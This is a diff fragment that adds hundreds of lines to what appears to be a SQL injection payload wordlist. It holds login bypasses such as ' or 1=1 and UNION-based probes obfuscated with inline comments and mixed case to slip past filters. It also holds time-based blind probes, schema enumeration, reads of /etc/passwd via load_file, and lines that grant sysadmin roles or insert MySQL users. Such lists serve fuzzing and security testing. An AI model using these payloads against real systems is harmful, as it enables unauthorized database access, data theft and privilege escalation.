 ' OR SELECT COUNT(*),concat(0x3a,0x3a,(SELECT database()),0x3a,0x3a, FLOOR(RAND() * 2))a FROM INFORMATION_SCHEMA.TABLES GROUP BY a
@@ -343,6 +688,10 @@ $
 ' OR benchmark(2000,md5(now())) --
 ' OR benchmark(2000,md5(now())) -- -
 ' OR benchmark(2000,md5(now()))--
+' OR strcmp(left('password',1), 0x69) = 1
+' OR strcmp(left('password',1), 0x69) = 1 --
+' OR strcmp(left('password',1), 0x69) = 1 -- -
+' OR strcmp(left('password',1), 0x69) = 1--
 ' OR substring(@@VERSION,1,1)=5 
 ' OR substring(@@VERSION,1,1)=5 -- 
 ' OR substring(@@VERSION,1,1)=5 -- - 
@@ -374,6 +723,16 @@ $
 ' and 'whatever' in ('whatever')
 ' and (EXISTS)
 ' and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
+' and /*union*/union/*select*/select+1,2,3,4,5,6,7,8,9,10/*
+' and /*union*/union/*select*/select+1,2,3,4,5,6,7,8,9/*
+' and /*union*/union/*select*/select+1,2,3,4,5,6,7,8/*
+' and /*union*/union/*select*/select+1,2,3,4,5,6,7/*
+' and /*union*/union/*select*/select+1,2,3,4,5,6/*
+' and /*union*/union/*select*/select+1,2,3,4,5/*
+' and /*union*/union/*select*/select+1,2,3,4/*
+' and /*union*/union/*select*/select+1,2,3/*
+' and /*union*/union/*select*/select+1,2/*
+' and /*union*/union/*select*/select+1/*
 ' and 0 uni/**/on sel/**/ect
 ' and 0=0 #
 ' and 0=0 #"
@@ -413,16 +772,144 @@ $
 ' and sleep(__TIME__)#
 ' and sleep(__TIME__)='
 ' and substr(version(),1,10) = 'PostgreSQL' and '1
+' and un/**/ion+sel/**/ect+1
+' and un/**/ion+sel/**/ect+1 --
+' and un/**/ion+sel/**/ect+1 -- -
+' and un/**/ion+sel/**/ect+1,2
+' and un/**/ion+sel/**/ect+1,2 --
+' and un/**/ion+sel/**/ect+1,2 -- -
+' and un/**/ion+sel/**/ect+1,2,3
+' and un/**/ion+sel/**/ect+1,2,3 --
+' and un/**/ion+sel/**/ect+1,2,3 -- -
+' and un/**/ion+sel/**/ect+1,2,3,4
+' and un/**/ion+sel/**/ect+1,2,3,4 --
+' and un/**/ion+sel/**/ect+1,2,3,4 -- -
+' and un/**/ion+sel/**/ect+1,2,3,4,5
+' and un/**/ion+sel/**/ect+1,2,3,4,5 --
+' and un/**/ion+sel/**/ect+1,2,3,4,5 -- -
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6 --
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6 -- -
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7 --
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7 -- -
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 --
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 -- -
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 --
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 -- -
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 --
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 -- -
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6,7--
+' and un/**/ion+sel/**/ect+1,2,3,4,5,6--
+' and un/**/ion+sel/**/ect+1,2,3,4,5--
+' and un/**/ion+sel/**/ect+1,2,3,4--
+' and un/**/ion+sel/**/ect+1,2,3--
+' and un/**/ion+sel/**/ect+1,2--
+' and un/**/ion+sel/**/ect+1--
+' and unIon(((((((selEct(1))))))))
+' and unIon(((((((selEct(1)))))))) --
+' and unIon(((((((selEct(1)))))))) -- -
+' and unIon(((((((selEct(1))))))))--
+' and unIon(((((((selEct(1),(2))))))))
+' and unIon(((((((selEct(1),(2)))))))) --
+' and unIon(((((((selEct(1),(2)))))))) -- -
+' and unIon(((((((selEct(1),(2))))))))--
+' and unIon(((((((selEct(1),(2),(3))))))))
+' and unIon(((((((selEct(1),(2),(3)))))))) --
+' and unIon(((((((selEct(1),(2),(3)))))))) -- -
+' and unIon(((((((selEct(1),(2),(3))))))))--
+' and unIon(((((((selEct(1),(2),(3),(4))))))))
+' and unIon(((((((selEct(1),(2),(3),(4)))))))) --
+' and unIon(((((((selEct(1),(2),(3),(4)))))))) -- -
+' and unIon(((((((selEct(1),(2),(3),(4))))))))--
+' and unIon(((((((selEct(1),(2),(3),(4),(5))))))))
+' and unIon(((((((selEct(1),(2),(3),(4),(5)))))))) --
+' and unIon(((((((selEct(1),(2),(3),(4),(5)))))))) -- -
+' and unIon(((((((selEct(1),(2),(3),(4),(5))))))))--
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) --
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) -- -
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))--
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) --
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))--
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+' and unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
 ' and union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END)
 ' and union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) --
 ' and union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) -- -
 ' and union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) -- - 
 ' and union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END)--
+' and union select load_file("/etc/passwd") 
+' and union select load_file("/etc/passwd") --
+' and union select load_file("/etc/passwd") -- -
+' and union select load_file("/etc/passwd")--
+' and union(((((((select(1))))))))
+' and union(((((((select(1)))))))) --
+' and union(((((((select(1)))))))) -- -
+' and union(((((((select(1))))))))--
+' and union(((((((select(1),(2))))))))
+' and union(((((((select(1),(2)))))))) --
+' and union(((((((select(1),(2)))))))) -- -
+' and union(((((((select(1),(2))))))))--
+' and union(((((((select(1),(2),(3))))))))
+' and union(((((((select(1),(2),(3)))))))) --
+' and union(((((((select(1),(2),(3)))))))) -- -
+' and union(((((((select(1),(2),(3))))))))--
+' and union(((((((select(1),(2),(3),(4))))))))
+' and union(((((((select(1),(2),(3),(4)))))))) --
+' and union(((((((select(1),(2),(3),(4)))))))) -- -
+' and union(((((((select(1),(2),(3),(4))))))))--
+' and union(((((((select(1),(2),(3),(4),(5))))))))
+' and union(((((((select(1),(2),(3),(4),(5)))))))) --
+' and union(((((((select(1),(2),(3),(4),(5)))))))) -- -
+' and union(((((((select(1),(2),(3),(4),(5))))))))--
+' and union(((((((select(1),(2),(3),(4),(5),(6))))))))
+' and union(((((((select(1),(2),(3),(4),(5),(6)))))))) --
+' and union(((((((select(1),(2),(3),(4),(5),(6)))))))) -- -
+' and union(((((((select(1),(2),(3),(4),(5),(6))))))))--
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) --
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))--
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+' and union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
 ' and union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns
 ' and union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns --
 ' and union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns -- -
 ' and union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns--
 ' and username like char(37);
+' and+5!=6
+' and+5!=6 --
+' and+5!=6 -- -
+' and+5!=6--
 ' exec sp_addsrvrolemember 'name' , 'sysadmin' --
 ' grant connect to name; grant resource to name; --
 ' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
@@ -434,6 +921,14 @@ $
 ' or ''^'
 ' or '1'='1
 ' or '1'='1'--
+' or '2'>'1
+' or '2'>'1 --
+' or '2'>'1 -- -
+' or '2'>'1' or '2'>'1
+' or '2'>'1' or '2'>'1 --
+' or '2'>'1' or '2'>'1 -- -
+' or '2'>'1' or '2'>'1--
+' or '2'>'1--
 ' or '7659'='7659
 ' or 'a'='a
 ' or 'something' = 'some'+'thing'
@@ -443,12 +938,26 @@ $
 ' or 'whatever' in ('whatever')
 ' or 'x'='x
 ' or (EXISTS)
+' or /*union*/union/*select*/select+1,2,3,4,5,6,7,8,9,10/*
+' or /*union*/union/*select*/select+1,2,3,4,5,6,7,8,9/*
+' or /*union*/union/*select*/select+1,2,3,4,5,6,7,8/*
+' or /*union*/union/*select*/select+1,2,3,4,5,6,7/*
+' or /*union*/union/*select*/select+1,2,3,4,5,6/*
+' or /*union*/union/*select*/select+1,2,3,4,5/*
+' or /*union*/union/*select*/select+1,2,3,4/*
+' or /*union*/union/*select*/select+1,2,3/*
+' or /*union*/union/*select*/select+1,2/*
+' or /*union*/union/*select*/select+1/*
 ' or 0=0 #
 ' or 0=0 #"
 ' or 0=0 --
 ' or 1
 ' or 1 --'
 ' or 1 in (select @@version)--
+' or 1 or'
+' or 1 or' --
+' or 1 or' -- -
+' or 1 or'--
 ' or 1/*
 ' or 1=1
 ' or 1=1 --
@@ -475,6 +984,86 @@ $
 ' or sleep(__TIME__)='
 ' or true--
 ' or uid like '%
+' or un/**/ion+sel/**/ect+1
+' or un/**/ion+sel/**/ect+1 --
+' or un/**/ion+sel/**/ect+1 -- -
+' or un/**/ion+sel/**/ect+1,2
+' or un/**/ion+sel/**/ect+1,2 --
+' or un/**/ion+sel/**/ect+1,2 -- -
+' or un/**/ion+sel/**/ect+1,2,3
+' or un/**/ion+sel/**/ect+1,2,3 --
+' or un/**/ion+sel/**/ect+1,2,3 -- -
+' or un/**/ion+sel/**/ect+1,2,3,4
+' or un/**/ion+sel/**/ect+1,2,3,4 --
+' or un/**/ion+sel/**/ect+1,2,3,4 -- -
+' or un/**/ion+sel/**/ect+1,2,3,4,5
+' or un/**/ion+sel/**/ect+1,2,3,4,5 --
+' or un/**/ion+sel/**/ect+1,2,3,4,5 -- -
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6 --
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6 -- -
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7 --
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7 -- -
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 --
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 -- -
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 --
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 -- -
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 --
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 -- -
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6,7--
+' or un/**/ion+sel/**/ect+1,2,3,4,5,6--
+' or un/**/ion+sel/**/ect+1,2,3,4,5--
+' or un/**/ion+sel/**/ect+1,2,3,4--
+' or un/**/ion+sel/**/ect+1,2,3--
+' or un/**/ion+sel/**/ect+1,2--
+' or un/**/ion+sel/**/ect+1--
+' or unIon(((((((selEct(1))))))))
+' or unIon(((((((selEct(1)))))))) --
+' or unIon(((((((selEct(1)))))))) -- -
+' or unIon(((((((selEct(1))))))))--
+' or unIon(((((((selEct(1),(2))))))))
+' or unIon(((((((selEct(1),(2)))))))) --
+' or unIon(((((((selEct(1),(2)))))))) -- -
+' or unIon(((((((selEct(1),(2))))))))--
+' or unIon(((((((selEct(1),(2),(3))))))))
+' or unIon(((((((selEct(1),(2),(3)))))))) --
+' or unIon(((((((selEct(1),(2),(3)))))))) -- -
+' or unIon(((((((selEct(1),(2),(3))))))))--
+' or unIon(((((((selEct(1),(2),(3),(4))))))))
+' or unIon(((((((selEct(1),(2),(3),(4)))))))) --
+' or unIon(((((((selEct(1),(2),(3),(4)))))))) -- -
+' or unIon(((((((selEct(1),(2),(3),(4))))))))--
+' or unIon(((((((selEct(1),(2),(3),(4),(5))))))))
+' or unIon(((((((selEct(1),(2),(3),(4),(5)))))))) --
+' or unIon(((((((selEct(1),(2),(3),(4),(5)))))))) -- -
+' or unIon(((((((selEct(1),(2),(3),(4),(5))))))))--
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) --
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) -- -
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))--
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) --
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))--
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+' or unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
 ' or uname like '%
 ' or uni/**/on sel/**/ect
 ' or union select (CASE WHEN (SELECT) like '3.%' THEN 'here' ELSE randomblob(50000000) END) --
@@ -483,6 +1072,50 @@ $
 ' or union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) -- -
 ' or union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END) -- - 
 ' or union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE randomblob(50000000) END)--
+' or union select load_file("/etc/passwd") 
+' or union select load_file("/etc/passwd") --
+' or union select load_file("/etc/passwd") -- -
+' or union select load_file("/etc/passwd")--
+' or union(((((((select(1))))))))
+' or union(((((((select(1)))))))) --
+' or union(((((((select(1)))))))) -- -
+' or union(((((((select(1))))))))--
+' or union(((((((select(1),(2))))))))
+' or union(((((((select(1),(2)))))))) --
+' or union(((((((select(1),(2)))))))) -- -
+' or union(((((((select(1),(2))))))))--
+' or union(((((((select(1),(2),(3))))))))
+' or union(((((((select(1),(2),(3)))))))) --
+' or union(((((((select(1),(2),(3)))))))) -- -
+' or union(((((((select(1),(2),(3))))))))--
+' or union(((((((select(1),(2),(3),(4))))))))
+' or union(((((((select(1),(2),(3),(4)))))))) --
+' or union(((((((select(1),(2),(3),(4)))))))) -- -
+' or union(((((((select(1),(2),(3),(4))))))))--
+' or union(((((((select(1),(2),(3),(4),(5))))))))
+' or union(((((((select(1),(2),(3),(4),(5)))))))) --
+' or union(((((((select(1),(2),(3),(4),(5)))))))) -- -
+' or union(((((((select(1),(2),(3),(4),(5))))))))--
+' or union(((((((select(1),(2),(3),(4),(5),(6))))))))
+' or union(((((((select(1),(2),(3),(4),(5),(6)))))))) --
+' or union(((((((select(1),(2),(3),(4),(5),(6)))))))) -- -
+' or union(((((((select(1),(2),(3),(4),(5),(6))))))))--
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) --
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))--
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+' or union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
 ' or union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns
 ' or union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns --
 ' or union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns -- -
@@ -506,8 +1139,14 @@ $
 '%20or%201=1
 '&'
 ')
+') or '1'='1--
+') or ('1'='1--
 ') or ('a'='a
 ') or ('x')=('x
+') or 1<2)
+') or 1<2) --
+') or 1<2) -- -
+') or 1<2)--
 ') or benchmark(10000000,MD5(1))#
 ') or pg_sleep(__TIME__)--
 ') or sleep(__TIME__)='
@@ -523,18 +1162,478 @@ $
 ')) or pg_sleep(__TIME__)--
 ')) or sleep(__TIME__)='
 '));waitfor delay '0:0:__TIME__'--
+')/**/or/**/'1'='1--
+')/**/or/**/('1'='1--
+')/**/or/**/1<2)
+')/**/or/**/1<2)--
+')/**/or/**/1<2)/**/--
+')/**/or/**/1<2)/**/--/**/-
 ');waitfor delay '0:0:__TIME__'--
 '*'
 '-'
+'/**/AND/**/SELECT/**/0x5045
+'/**/AND/**/SELECT/**/0x5045--
+'/**/AND/**/SELECT/**/0x5045/**/--
+'/**/AND/**/SELECT/**/0x5045/**/--/**/-
+'/**/AND/**/SELECT/**/CHAR(0x66)
+'/**/AND/**/SELECT/**/CHAR(0x66)--
+'/**/AND/**/SELECT/**/CHAR(0x66)/**/--
+'/**/AND/**/SELECT/**/CHAR(0x66)/**/--/**/-
+'/**/AND/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+'/**/AND/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
+'/**/AND/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--
+'/**/AND/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--/**/-
+'/**/AND/**/strcmp(left('password',1),/**/0x69)/**/=/**/1
+'/**/AND/**/strcmp(left('password',1),/**/0x69)/**/=/**/1--
+'/**/AND/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--
+'/**/AND/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--/**/-
+'/**/OR/**/SELECT/**/0x5045
+'/**/OR/**/SELECT/**/0x5045--
+'/**/OR/**/SELECT/**/0x5045/**/--
+'/**/OR/**/SELECT/**/0x5045/**/--/**/-
+'/**/OR/**/SELECT/**/CHAR(0x66)
+'/**/OR/**/SELECT/**/CHAR(0x66)--
+'/**/OR/**/SELECT/**/CHAR(0x66)/**/--
+'/**/OR/**/SELECT/**/CHAR(0x66)/**/--/**/-
+'/**/OR/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+'/**/OR/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
+'/**/OR/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--
+'/**/OR/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--/**/-
+'/**/OR/**/strcmp(left('password',1),/**/0x69)/**/=/**/1
+'/**/OR/**/strcmp(left('password',1),/**/0x69)/**/=/**/1--
+'/**/OR/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--
+'/**/OR/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--/**/-
+'/**/and+5!=6
+'/**/and+5!=6--
+'/**/and+5!=6/**/--
+'/**/and+5!=6/**/--/**/-
+'/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8,9,10/*
+'/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8,9/*
+'/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8/*
+'/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6,7/*
+'/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6/*
+'/**/and/**//*union*/union/*select*/select+1,2,3,4,5/*
+'/**/and/**//*union*/union/*select*/select+1,2,3,4/*
+'/**/and/**//*union*/union/*select*/select+1,2,3/*
+'/**/and/**//*union*/union/*select*/select+1,2/*
+'/**/and/**//*union*/union/*select*/select+1/*
+'/**/and/**/un/**/ion+sel/**/ect+1
+'/**/and/**/un/**/ion+sel/**/ect+1,2
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--/**/-
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--/**/-
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--/**/-
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--/**/-
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--/**/-
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4,5/**/--/**/-
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3,4/**/--/**/-
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1,2,3/**/--/**/-
+'/**/and/**/un/**/ion+sel/**/ect+1,2--
+'/**/and/**/un/**/ion+sel/**/ect+1,2/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1,2/**/--/**/-
+'/**/and/**/un/**/ion+sel/**/ect+1--
+'/**/and/**/un/**/ion+sel/**/ect+1/**/--
+'/**/and/**/un/**/ion+sel/**/ect+1/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1))))))))
+'/**/and/**/unIon(((((((selEct(1))))))))--
+'/**/and/**/unIon(((((((selEct(1))))))))/**/--
+'/**/and/**/unIon(((((((selEct(1))))))))/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1),(2))))))))
+'/**/and/**/unIon(((((((selEct(1),(2))))))))--
+'/**/and/**/unIon(((((((selEct(1),(2))))))))/**/--
+'/**/and/**/unIon(((((((selEct(1),(2))))))))/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1),(2),(3))))))))
+'/**/and/**/unIon(((((((selEct(1),(2),(3))))))))--
+'/**/and/**/unIon(((((((selEct(1),(2),(3))))))))/**/--
+'/**/and/**/unIon(((((((selEct(1),(2),(3))))))))/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4))))))))
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4))))))))--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4))))))))/**/--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4))))))))/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--
